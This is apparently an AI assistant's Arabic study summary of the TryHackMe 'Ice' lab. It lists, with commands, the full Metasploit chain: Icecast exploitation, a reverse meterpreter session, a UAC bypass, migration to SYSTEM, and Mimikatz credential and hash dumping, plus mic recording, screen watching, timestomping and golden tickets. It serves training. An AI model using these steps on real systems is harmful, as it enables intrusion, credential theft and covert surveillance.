تمام، دلوقتي نعمل **ملخص شامل** للروم **Ice** بشكل مرتب وواضح، ونركز جدًا على الجزء اللي طلبته:  
خصوصًا من بعد الدخول على **Meterpreter (واجهة تحكم متقدمة بعد الاستغلال)**، وموضوع **Privilege Escalation (تصعيد الصلاحيات)**، وكل **Command (أمر)** استخدمناه.

---

# 1) فكرة الروم نظريًا

روم **Ice** فكرتها الأساسية إنك تتعامل مع جهاز **Windows (ويندوز)** ضعيف الحماية جدًا، وعليه خدمة اسمها **Icecast (خادم بث وسائط)** فيها **Vulnerability (ثغرة)** معروفة.  
أنت في الروم تمشي بمراحل **Pentest (اختبار الاختراق)** الكلاسيكية:

1. **Reconnaissance (استطلاع / جمع معلومات أولي)**
    
2. **Scanning (فحص)**
    
3. **Enumeration (استكشاف الخدمات والتفاصيل)**
    
4. **Vulnerability Research (البحث عن الثغرة)**
    
5. **Exploitation (استغلال الثغرة)**
    
6. **Privilege Escalation (تصعيد الصلاحيات)**
    
7. **Looting (جمع بيانات اعتماد ومعلومات حساسة)**
    
8. **Post-Exploitation (ما بعد الاستغلال)**
    

الروم هدفها مش مجرد “تدخل الجهاز”، لكن تفهم:

- إزاي تحدد الخدمة الضعيفة
    
- إزاي تربط **Version (الإصدار)** بالثغرة
    
- إزاي تستخدم **Metasploit (إطار استغلال الثغرات)** بشكل منطقي
    
- إزاي تنتقل من **User Access (وصول مستخدم عادي)** إلى **SYSTEM (أعلى صلاحية في ويندوز)**
    
- وإيه اللي ممكن يتعمل بعد كده داخل النظام
    

---

# 2) الصورة الكبيرة للروم من أولها لآخرها

أنت عملت تقريبًا السلسلة دي:

**OpenVPN (اتصال الشبكة الخاصة)**  
↓  
عرفت **Target IP (عنوان الهدف)**  
↓  
عملت **Nmap Scan (فحص Nmap)**  
↓  
لقيت خدمة **Icecast** على **Port (منفذ)** `8000`  
↓  
بحثت عن الثغرة  
↓  
عرفت إن النسخة الضعيفة مرتبطة بـ **CVE-2004-1561**  
↓  
استخدمت **Metasploit Module (وحدة Metasploit)**:  
`exploit/windows/http/icecast_header`  
↓  
فتحت **Meterpreter Shell (جلسة Meterpreter)**  
↓  
عرفت معلومات النظام والمستخدم  
↓  
شغلت **Local Exploit Suggester (مقترح ثغرات التصعيد المحلي)**  
↓  
اخترت **Privilege Escalation Exploit (ثغرة تصعيد صلاحيات)**  
↓  
بقيت عندك صلاحيات أعلى  
↓  
انتقلت إلى **spoolsv.exe (خدمة الطباعة)**  
↓  
بقيت **NT AUTHORITY\SYSTEM**  
↓  
حمّلت **Kiwi (نسخة Mimikatz داخل Meterpreter)**  
↓  
استخرجت **Credentials (بيانات الاعتماد)** و **Hashes (هاشات كلمات المرور)**  
↓  
راجعت أوامر **Post-Exploitation (ما بعد الاستغلال)**

---

# 3) شرح الجزء الأول بسرعة: لحد ما لقيت الثغرة واستغليتها

أنت قلت إنك فاهم الجزء ده إلى حد ما، فهنا هنشرحه بسرعة لكن بشكل مرتب.

## أولًا: الفحص باستخدام Nmap

الأمر:

```bash
nmap -sS -sV 10.113.155.139
```

### شرح الأمر

**nmap**  
أداة **Network Mapper (فحص الشبكات واستكشاف البورتات)**

**-sS**  
نوع فحص اسمه **SYN Scan (فحص SYN / فحص شبه مخفي)**  
يستخدم لاكتشاف إذا كان **Port (المنفذ)** مفتوح أم لا.

**-sV**  
يعني **Service Version Detection (تحديد الخدمة والإصدار)**  
يحاول يعرف الخدمة العاملة على البورت.

### ماذا فهمنا من الناتج

أهم سطور الناتج كانت:

- `3389` → **RDP (بروتوكول سطح المكتب البعيد)**
    
- `8000` → **Icecast**
    
- اسم الجهاز: `DARK-PC`
    

أهم نقطة هنا كانت:

```text
8000/tcp open http Icecast streaming media server
```

يعني على البورت `8000` فيه خدمة **Icecast (خادم بث وسائط)**.

---

## ثانيًا: البحث عن الثغرة

الأمر:

```bash
searchsploit Icecast
```

### شرح الأمر

**searchsploit**  
أداة للبحث داخل قاعدة **Exploit-DB (قاعدة بيانات أكواد الاستغلال)**

أنت دورت على كلمة:  
**Icecast**

فطلع لك نتائج كثيرة، وأهمها:

- **Remote Code Execution (تنفيذ أوامر عن بعد)** على **Icecast 2.0.1**
    
- وفيه **Metasploit Module (وحدة Metasploit)** جاهزة
    

وده مهم لأن:

- الجهاز **Windows**
    
- الخدمة **Icecast**
    
- الثغرة تعطي **RCE (تنفيذ أوامر عن بعد)**
    

---

## ثالثًا: معلومات الثغرة

من الروم:

- **CVE (رقم تعريف الثغرة)**: `CVE-2004-1561`
    
- **Impact Score (درجة التأثير)**: `6.4`
    

### معنى Impact Score (درجة التأثير)

ده رقم يوضح مدى تأثير الثغرة لو تم استغلالها بنجاح.  
يعني: لو واحد استغلها، الضرر المتوقع قد إيه.

---

## رابعًا: استخدام Metasploit

الأمر:

```bash
msfconsole
```

### شرح الأمر

يشغل **Metasploit Framework (إطار استغلال الثغرات)**.

بعدها بحثت:

```bash
search icecast
```

فطلع لك المسار:

```text
exploit/windows/http/icecast_header
```

وده كان **Exploit Module (وحدة الاستغلال)** المطلوبة.

بعدها استخدمته:

```bash
use exploit/windows/http/icecast_header
```

ثم عرضت الإعدادات:

```bash
show options
```

وكان أهم **Option (إعداد)** ناقص هو:

```text
RHOSTS
```

### معنى RHOSTS

**Remote Hosts (الأجهزة الهدف)**  
يعني عنوان **IP (عنوان الشبكة)** للجهاز الضحية.

بعدها ضبطت:

- **RHOSTS** = عنوان الهدف
    
- **LHOST** = عنوان جهازك على شبكة TryHackMe
    

ثم شغلت:

```bash
exploit
```

أو:

```bash
run
```

---

## خامسًا: ماذا حدث بعد الاستغلال

بعد نجاح الاستغلال، حصلت على:

**Meterpreter (جلسة تحكم متقدمة)**

وده كان جواب سؤال:

> ما اسم الـ Shell (الواجهة) التي حصلنا عليها؟

الإجابة:  
**meterpreter**

---

# 4) من بعد Meterpreter: الشرح العميق

وده أهم جزء عندك، وهنمشيه بالترتيب الحقيقي اللي حصل.

---

## أول أوامر بعد الدخول

### الأمر:

```bash
getuid
```

### وظيفته

يعرض **User Identity (هوية المستخدم الحالي)** الذي تعمل به الجلسة.

### عندك ظهر:

```text
Server username: Dark-PC\Dark
```

### معنى النتيجة

أنت دخلت الجهاز لكن بصلاحيات المستخدم:  
**Dark**

يعني عندك **Foothold (موطئ قدم / وصول أولي)**  
لكن **لسه مش Administrator (مدير النظام)** ولا **SYSTEM (أعلى صلاحية في ويندوز)**.

---

## الأمر:

```bash
sysinfo
```

### وظيفته

يعرض **System Information (معلومات النظام)**

مثل:

- اسم الجهاز
    
- نظام التشغيل
    
- **Build (رقم البناء / الإصدار الداخلي)**
    
- **Architecture (المعمارية)**
    

### أهم معلومتين أخذناهم

- **Build** = `7601`
    
- **Architecture** = `x64`
    

### لماذا هذه المعلومات مهمة؟

لأن **Privilege Escalation Exploit (ثغرة تصعيد صلاحيات)** لازم تكون:

- مناسبة لنسخة ويندوز
    
- مناسبة للمعمارية `x86` أو `x64`
    

---

# 5) أهم جزء: Privilege Escalation (تصعيد الصلاحيات)

## يعني إيه Privilege Escalation (تصعيد الصلاحيات)؟

يعني أنت دخلت الجهاز، لكن بصلاحيات محدودة.  
المرحلة التالية هي أنك تحاول ترفع صلاحياتك من:

- **User (مستخدم عادي)**  
    إلى:
    
- **Administrator (مدير النظام)**  
    أو:
    
- **SYSTEM (أعلى صلاحية في ويندوز)**
    

### ليه نحتاجه؟

لأن كثير من الأشياء الحساسة لا يمكن الوصول لها إلا بصلاحيات أعلى:

- قراءة **LSASS (خدمة المصادقة في ويندوز)**
    
- استخراج **Passwords (كلمات المرور)** و **Hashes (هاشات)**
    
- الوصول لملفات النظام
    
- تثبيت **Persistence (استمرارية الوصول)**
    

---

## الخطوة الأولى: إخراج السيشن للخلفية

الأمر:

```bash
background
```

### ماذا يفعل؟

يرجعك من **Meterpreter** إلى **msfconsole**  
لكن يترك **Session (الجلسة)** شغالة في الخلفية.

### لماذا فعلنا هذا؟

لأننا نريد استخدام **Module (وحدة)** جديدة داخل Metasploit، لكن على نفس الجلسة التي فتحناها.

---

## البحث عن ثغرات تصعيد محلية

الأمر:

```bash
search suggester
```

### الهدف

البحث عن **Module (وحدة)** تساعدنا في اقتراح ثغرات تصعيد الصلاحيات.

طلع لك:

```text
post/multi/recon/local_exploit_suggester
```

### معنى الاسم

**post** = وحدة **Post-Exploitation (ما بعد الاستغلال)**  
**multi** = تعمل على أكثر من نظام  
**recon** = **Reconnaissance (استطلاع / استكشاف)**  
**local_exploit_suggester** = تقترح **Local Exploits (ثغرات محلية)**

---

## استخدام الأداة

الأمر:

```bash
use post/multi/recon/local_exploit_suggester
```

ثم:

```bash
show options
```

ثم:

```bash
set SESSION 1
```

### لماذا نضع SESSION؟

لأن الموديول لازم يعرف:  
على أي **Session (جلسة)** يفحص النظام.

### ثم:

```bash
run
```

---

## ماذا فعلت هذه الأداة بالضبط؟

وهنا النقطة التي وضحناها قبل كده:

هي **لا تنفذ تصعيد الصلاحيات بنفسها**  
هي فقط:

- تفحص النظام
    
- تقرأ نسخة ويندوز
    
- تقرأ المعمارية
    
- تقارن ذلك بقاعدة الثغرات
    
- تعطيك قائمة **Exploits (استغلالات)** تصلح لتصعيد الصلاحيات
    

### إذًا:

أنت لم تكن تبحث عن **Payload (حمولة)**  
بل كنت تبحث عن:

**Privilege Escalation Exploit (ثغرة تصعيد صلاحيات)**

وده كان التصحيح المهم جدًا في فهمك.

---

## أول نتيجة ظهرت

في الروم، أول **Exploit** مناسب كان:

```text
exploit/windows/local/bypassuac_eventvwr
```

### معنى المسار

**exploit** = وحدة استغلال  
**windows** = لويندوز  
**local** = ثغرة محلية داخل النظام بعد الدخول  
**bypassuac_eventvwr** = استغلال يتجاوز **UAC (التحكم في حساب المستخدم)**

---

## استخدام Exploit تصعيد الصلاحيات

الأمر:

```bash
use exploit/windows/local/bypassuac_eventvwr
```

ثم:

```bash
show options
```

ثم:

```bash
set SESSION 1
```

ثم ظهر خيار إضافي مهم:

```text
LHOST
```

### معنى LHOST

**Local Host (عنوان جهازك)**  
يعني العنوان الذي سيرجع إليه الاتصال العكسي.

ثم:

```bash
run
```

---

## بعد تنفيذ Exploit التصعيد

هنا يحصل واحد من احتمالين:

### 1) يفتح Session جديدة

مثلاً:

- **session 1** = بصلاحيات أقل
    
- **session 2** = بصلاحيات أعلى
    

### 2) يرفع نفس الجلسة

أحيانًا نفس الجلسة تتغير صلاحياتها.

### كيف تتأكد؟

بأمر:

```bash
getuid
```

أو تنظر إلى الصلاحيات الجديدة.

---

## الأمر:

```bash
getprivs
```

### وظيفته

يعرض **Privileges (الصلاحيات)** الموجودة حاليًا في الجلسة.

### من ضمنها:

```text
SeTakeOwnershipPrivilege
```

وده كان جواب السؤال:

> أي صلاحية تسمح بأخذ ملكية الملفات؟

### معنى:

**SeTakeOwnershipPrivilege**  
صلاحية تسمح لك بـ **Take Ownership (أخذ ملكية الملفات والكائنات)**

ودي مهمة جدًا لأنها تسمح بالتحكم في ملفات لم تكن تملكها قبل ذلك.

---

# 6) لماذا كنا ما زلنا نحتاج خطوة أخرى بعد التصعيد؟

هنا نقطة مهمة جدًا.

حتى بعد التصعيد، الروم قالت:  
لازم نكون داخل **Process (عملية)** مناسبة عشان نتعامل مع:  
**lsass.exe**

## ما هو lsass.exe؟

**LSASS (Local Security Authority Subsystem Service)**  
خدمة مسؤولة عن:

- **Authentication (المصادقة)**
    
- إدارة **Credentials (بيانات الاعتماد)**
    
- تخزين معلومات حساسة في الذاكرة
    

### المشكلة

لكي تتفاعل معه، لازم تكون داخل عملية:

- نفس **Architecture (المعمارية)** → `x64`
    
- نفس **Permissions (الصلاحيات)** → `SYSTEM`
    

---

# 7) رؤية العمليات

الأمر:

```bash
ps
```

### وظيفته

يعرض **Process List (قائمة العمليات)**

### أهم عمودين عندنا

- **Arch (المعمارية)**
    
- **User (المستخدم الذي يشغل العملية)**
    

ولقينا العملية المناسبة:

```text
spoolsv.exe
```

### لماذا spoolsv.exe؟

لأنها:

- تعمل كـ **NT AUTHORITY\SYSTEM**
    
- معمارية **x64**
    
- وإذا تعطلت يعيدها النظام
    
- مناسبة للهجرة إليها
    

### معنى spoolsv.exe

هي **Printer Spooler Service (خدمة الطباعة)**

---

# 8) Process Migration (الهجرة إلى عملية أخرى)

الأمر:

```bash
migrate -N spoolsv.exe
```

### شرح الأمر

**migrate** = نقل جلسة Meterpreter إلى عملية أخرى  
**-N** = تحديد العملية بالاسم  
**spoolsv.exe** = اسم العملية الهدف

### ماذا حدث فعليًا؟

تم نقل الجلسة من عملية إلى عملية أخرى داخل النظام.

أنت رأيت:

```text
Migrating from 3364 to 1268...
[*] Migration completed successfully.
```

يعني:

- كنت داخل عملية معينة
    
- وانتقلت إلى `spoolsv.exe`
    

### لماذا هذه الخطوة مهمة؟

لأنك أصبحت الآن “تعيش داخل” عملية:

- بصلاحيات **SYSTEM**
    
- ومعمارية `x64`
    

وده يسمح لك بالتعامل مع **LSASS**

---

## بعد الـ migrate

الأمر:

```bash
getuid
```

وظهر:

```text
NT AUTHORITY\SYSTEM
```

### معنى النتيجة

أنت الآن بأعلى صلاحية تقريبًا في ويندوز.  
وده يعادل تقريبًا **root (الجذر)** في **Linux (لينكس)**، لكن في ويندوز الاسم هو **SYSTEM**.

---

# 9) Looting (جمع البيانات الحساسة)

## تحميل Kiwi

الأمر:

```bash
load kiwi
```

### معنى الأمر

**load** = تحميل إضافة داخل Meterpreter  
**kiwi** = نسخة مدمجة من **Mimikatz (أداة استخراج بيانات الاعتماد من الذاكرة)**

### لماذا احتجناها؟

لأننا نريد استخراج:

- **Credentials (بيانات الاعتماد)**
    
- **Passwords (كلمات المرور)**
    
- **Hashes (هاشات كلمات المرور)**
    

من **Memory (الذاكرة)**

---

## رؤية الأوامر الجديدة

الأمر:

```bash
help
```

بعد تحميل **kiwi** ظهر قسم جديد في المساعدة.

---

## استخراج كل بيانات الاعتماد

الأمر:

```bash
creds_all
```

### وظيفته

استخراج كل **Credentials (بيانات الاعتماد)** التي يمكن الوصول لها من النظام.

### كيف يعمل؟

يتعامل مع **LSASS** ويقرأ من الذاكرة:

- كلمات المرور
    
- **NTLM Hashes (هاشات NTLM)**
    
- أحيانًا **Kerberos Tickets (تذاكر كيربيروس)**
    

### لماذا قدرنا نجيب كلمة مرور Dark؟

لأن المستخدم **Dark** كانت توجد له **Scheduled Task (مهمة مجدولة)** تشغّل **Icecast** باسمه، فبياناته كانت متاحة في الذاكرة حتى لو لم يكن “فاتح جلسة تفاعلية” بنفسه.

---

# 10) Post-Exploitation (ما بعد الاستغلال)

بعد ما بقيت **SYSTEM** وحمّلت **Kiwi**، الروم بدأت تعرض أوامر مهمة داخل **Meterpreter**.  
خلينا نشرحهم كلهم.

---

## 1) hashdump

الأمر:

```bash
hashdump
```

### وظيفته

استخراج **Password Hashes (هاشات كلمات المرور)** المخزنة على النظام.

### ما هو Hash (هاش)؟

**Hash (بصمة رياضية)** لكلمة المرور، مش كلمة المرور نفسها.  
يستخدم للتحقق من كلمة المرور دون حفظها بصورتها الأصلية.

### لماذا مهم؟

لأن المهاجم يمكنه:

- كسر الهاش **Cracking (فك الهاش)**
    
- أو استخدامه في بعض الهجمات مثل **Pass-the-Hash (المرور بالهاش)**
    

---

## 2) screenshare

الأمر:

```bash
screenshare
```

### وظيفته

مشاهدة **Desktop (سطح المكتب)** الخاص بالمستخدم على الجهاز الهدف بشكل حي.

### الفرق بينه وبين screenshot

- **screenshot** = صورة واحدة
    
- **screenshare** = مشاهدة مستمرة مباشرة
    

---

## 3) record_mic

الأمر:

```bash
record_mic
```

### وظيفته

تسجيل **Audio (الصوت)** من **Microphone (الميكروفون)** الموجود على الجهاز.

### مثال

```bash
record_mic -d 10
```

**-d** = **Duration (مدة التسجيل)**

---

## 4) timestomp

الأمر:

```bash
timestomp
```

### وظيفته

تعديل **Timestamps (الطوابع الزمنية)** للملفات:

- وقت الإنشاء
    
- وقت التعديل
    
- وقت الوصول
    

### ليه ده خطير؟

لأنه يدخل في **Anti-Forensics (إخفاء أو تعقيد التحقيق الجنائي الرقمي)**  
يعني يجعل تتبع ما حدث أصعب.

---

## 5) golden_ticket_create

الأمر:

```bash
golden_ticket_create
```

### وظيفته

إنشاء **Golden Ticket (تذكرة ذهبية)**

### يعني إيه Golden Ticket؟

هجوم في بيئات **Windows Domain (بيئة الدومين)** يعتمد على **Kerberos (نظام المصادقة)**  
ويسمح للمهاجم بتزوير **TGT (تذكرة منح التذاكر)** ليظهر كأنه أي مستخدم تقريبًا داخل الدومين.

### النتيجة

- **Persistence (استمرارية الوصول)**
    
- القدرة على المصادقة على خدمات كثيرة داخل الدومين
    

---

# 11) الفرق بين بعض المصطلحات التي تلخبطت فيها

## Exploit (استغلال)

هو الكود أو الطريقة التي تستغل **Vulnerability (ثغرة)**

مثال:  
`exploit/windows/http/icecast_header`

---

## Payload (حمولة)

هو الكود الذي يتم تشغيله **بعد نجاح الاستغلال**

مثال:  
`windows/meterpreter/reverse_tcp`

### معنى هذا الـ Payload

- **windows** = لويندوز
    
- **meterpreter** = جلسة Meterpreter
    
- **reverse_tcp** = اتصال عكسي من الهدف إليك
    

---

## Post Module (وحدة ما بعد الاستغلال)

وحدة لا تستغل ثغرة بنفسها، لكنها تعمل بعد الدخول على الجهاز

مثال:  
`post/multi/recon/local_exploit_suggester`

---

## Session (جلسة)

اتصالك الحالي بالجهاز الهدف داخل Metasploit

---

## Meterpreter

جلسة تحكم متقدمة تسمح لك بعمل:

- أوامر نظام
    
- إدارة ملفات
    
- جمع معلومات
    
- تحميل إضافات
    
- الانتقال بين العمليات
    

---

# 12) أهم فهم لازم يثبت عندك في موضوع Privilege Escalation

أنت وصلت للنقطة دي كويس، لكن خليني أثبتها بصياغة نهائية واضحة:

### الذي حدث:

1. استغليت ثغرة **Icecast**
    
2. فتحت **Meterpreter Session**
    
3. دخلت بصلاحيات **Dark**
    
4. خرجت بـ `background`
    
5. استخدمت **Local Exploit Suggester**
    
6. الأداة اقترحت **ثغرات تصعيد صلاحيات**
    
7. اخترت واحدة منها
    
8. شغلتها على **Session** الحالية
    
9. حصلت على صلاحيات أعلى
    
10. بعد ذلك انتقلت إلى `spoolsv.exe`
    
11. أصبحت **NT AUTHORITY\SYSTEM**
    
12. قدرت تتعامل مع **LSASS**
    
13. استخرجت **Credentials**
    

### أهم تصحيح:

أنت لم تكن تبحث عن **Payload (حمولة)** يرفع الصلاحيات  
بل كنت تبحث عن:

**Privilege Escalation Exploit (ثغرة تصعيد صلاحيات)**

وده كان أهم تصحيح مفاهيمي في الروم.

---

# 13) الأوامر التي استخدمناها كلها، مرتبة حسب المرحلة

## الاستكشاف

```bash
nmap -sS -sV 10.113.155.139
searchsploit Icecast
```

## Metasploit والدخول الأولي

```bash
msfconsole
search icecast
use exploit/windows/http/icecast_header
show options
set RHOSTS 10.113.155.139
set LHOST YOUR_IP
exploit
```

## بعد الدخول

```bash
getuid
sysinfo
```

## تصعيد الصلاحيات

```bash
background
search suggester
use post/multi/recon/local_exploit_suggester
show options
set SESSION 1
run
use exploit/windows/local/bypassuac_eventvwr
show options
set SESSION 1
set LHOST YOUR_IP
run
getprivs
```

## العمليات والهجرة

```bash
ps
migrate -N spoolsv.exe
getuid
```

## Kiwi / Mimikatz

```bash
load kiwi
help
creds_all
hashdump
```

## أوامر ما بعد الاستغلال

```bash
screenshare
record_mic
timestomp
golden_ticket_create
```

---

# 14) الخلاصة الفكرية للروم

الروم علمتك 5 أفكار مهمة جدًا:

## أولًا

وجود **Service (خدمة)** غريبة أو قديمة مثل **Icecast** قد يكون مدخل ممتاز للهجوم.

## ثانيًا

معرفة **Version (الإصدار)** مهمة جدًا لأنها تربطك مباشرة بالثغرة المناسبة.

## ثالثًا

الدخول الأولي لا يعني أنك “خلصت”.  
كثير جدًا من القيمة الحقيقية تأتي بعد **Privilege Escalation (تصعيد الصلاحيات)**

## رابعًا

**Meterpreter** ليس مجرد “شل”، بل بيئة عمل كاملة لـ **Post-Exploitation**

## خامسًا

بعد أن تصبح **SYSTEM**، تفتح أمامك إمكانيات كثيرة جدًا مثل:

- رؤية العمليات الحساسة
    
- الهجرة لعمليات أخرى
    
- قراءة الذاكرة
    
- استخراج بيانات اعتماد
    
- تنفيذ أوامر متقدمة
    

---

# 15) أهم المصطلحات في الروم ومعناها السريع

- **Enumeration (استكشاف)**: جمع تفاصيل عن الخدمات والنظام
    
- **Vulnerability (ثغرة)**: ضعف أمني يمكن استغلاله
    
- **Exploit (استغلال)**: الكود أو الطريقة التي تستغل الثغرة
    
- **Payload (حمولة)**: ما يتم تشغيله بعد نجاح الاستغلال
    
- **Foothold (موطئ قدم)**: أول وصول للنظام
    
- **Privilege Escalation (تصعيد الصلاحيات)**: التحول من صلاحيات ضعيفة إلى أقوى
    
- **Session (جلسة)**: اتصالك الحالي بالجهاز الهدف
    
- **Meterpreter**: جلسة تحكم متقدمة
    
- **LSASS**: خدمة المصادقة في ويندوز
    
- **Migration (هجرة)**: نقل الجلسة إلى عملية أخرى
    
- **Credentials (بيانات الاعتماد)**: اسم مستخدم / كلمة مرور / هاش
    
- **Hash (هاش)**: بصمة رياضية لكلمة المرور
    
- **Post-Exploitation (ما بعد الاستغلال)**: كل ما تفعله بعد الدخول للجهاز
    
- **Persistence (استمرارية الوصول)**: المحافظة على طريقة رجوع للنظام لاحقًا
    
- **Golden Ticket (تذكرة ذهبية)**: تزوير تذكرة Kerberos في بيئة الدومين
    

---

لو تحب، أقدر في الرسالة التالية أعمل لك **ملخص ثاني بشكل مختلف**:  
واحد على هيئة **Workflow (تسلسل عملي سريع)** من أول أمر لآخر أمر، بحيث يبقى معك كورقة مراجعة قبل أي روم شبهها.